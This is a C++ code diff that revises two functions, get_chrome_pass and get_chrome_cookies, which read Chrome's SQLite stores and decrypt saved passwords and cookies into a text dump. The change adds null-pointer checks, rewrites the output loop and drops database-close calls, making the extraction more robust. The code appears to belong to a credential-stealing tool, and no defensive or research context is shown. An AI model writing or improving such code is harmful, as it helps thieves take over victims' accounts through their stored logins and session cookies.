@@ -8,7 +8,7 @@ stringstream get_chrome_pass(sqlite3* db)
 
     stringstream dump(string(""));
     sqlite3_stmt *pStmt;
-    int rc;
+    int rc, i;
     rc=sqlite3_prepare(db, sql.c_str(), -1, &pStmt, 0);
     if (rc!=SQLITE_OK)
     {
@@ -38,11 +38,17 @@ stringstream get_chrome_pass(sqlite3* db)
                 NULL,
                 0,
                 &decryptedPass);
-        char *password=(char *)decryptedPass.pbData;
-        while(isprint(*password))
+        if(decryptedPass.pbData==nullptr)
         {
-            dump<<*password;
-            password++;
+            cerr<<"get_chrome_pass() error"<<endl;
+            return dump;
+        }
+
+        i=0;
+        while(decryptedPass.pbData[i])
+        {
+            dump<<decryptedPass.pbData[i];
+            i++;
         }
 
         dump<<endl;
@@ -50,7 +56,6 @@ stringstream get_chrome_pass(sqlite3* db)
         rc=sqlite3_step(pStmt);
     }
     rc=sqlite3_finalize(pStmt);
-    sqlite3_close(db);
     return dump;
 }
 
@@ -60,7 +65,7 @@ stringstream get_chrome_cookies(sqlite3* db)
 
     stringstream dump(string(""));
     sqlite3_stmt *pStmt;
-    int rc;
+    int rc, i;
     rc=sqlite3_prepare(db, sql.c_str(), -1, &pStmt, 0);
     if (rc!=SQLITE_OK)
     {
@@ -91,14 +96,17 @@ stringstream get_chrome_cookies(sqlite3* db)
                 NULL,
                 0,
                 &decryptedCookies);
-        //char *cookies=(char *)decryptedCookies.pbData;
-        int i=0;
+        if(decryptedCookies.pbData==nullptr)
+        {
+            cerr<<"get_chrome_cookies() error"<<endl;
+            return dump;
+        }
+
+        i=0;
         while(decryptedCookies.pbData[i])
         {
-            //dump<<*cookies;
             dump<<decryptedCookies.pbData[i];
             i++;
-            //cookies++;
         }
 
         dump<<endl;
@@ -107,7 +115,6 @@ stringstream get_chrome_cookies(sqlite3* db)
     }
     
     rc=sqlite3_finalize(pStmt);
-    sqlite3_close(db);
     return dump;
 }
 
